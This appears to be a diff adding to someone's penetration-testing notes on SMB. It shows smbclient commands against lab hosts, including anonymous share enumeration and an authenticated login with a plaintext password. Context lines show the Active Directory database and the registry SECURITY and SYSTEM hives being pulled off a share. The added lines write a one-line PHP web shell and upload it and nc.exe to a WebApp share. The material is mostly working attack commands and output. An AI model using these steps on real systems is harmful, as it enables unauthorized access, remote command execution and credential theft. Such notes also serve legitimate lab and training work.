@@ -9,6 +9,24 @@ sudo /etc/init.d/smbd restart
 smbclient -L 127.0.0.1 -U Administrator
 smbclient -L 10.11.0.22 --port=4455 --user=Administrator
 
+#Connecting to smb
+┌──(kali㉿kali)-[~]
+└─$ smbclient -N -L 192.168.120.116                                     
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DocumentsShare  Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+-->
+smbclient -N //192.168.120.116/DocumentsShare
+
+
+
 #Authenticated connection to SMB 
 smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'
 └─$ smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'
@@ -35,4 +53,28 @@ getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.j
 getting file \registry\SECURITY of size 65536 as registry/SECURITY (470.6 KiloBytes/sec) (average 3079.7 KiloBytes/sec)
 getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3202.5 KiloBytes/sec) (average 3127.6 KiloBytes/sec)
 smb: \> 
+
+# list smb shares
+smbclient -U thecybergeek -L \\\\192.168.213.129\\
+
+#Connecting to smb service
+smbclient -U thecybergeek \\\\192.168.213.129\\WebApp
+
+#Upload a shell to smb server
+
+# PHP Shell Code
+┌──(kali㉿kali)-[~]
+└─$ cat shell.php
+<?php system($_GET["cmd"]); ?>
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -U thecybergeek \\\\192.168.213.129\\WebApp
+
+Enter WORKGROUP\thecybergeek's password:
+Try "help" to get a list of possible commands.
+smb: \> put shell.php
+putting file shell.php as \shell.php (30.3 kb/s) (average 30.3 kb/s)
+smb: \> put nc.exe
+putting file nc.exe as \nc.exe (19332.7 kb/s) (average 19333.3 kb/s)
+smb: \> exit
 
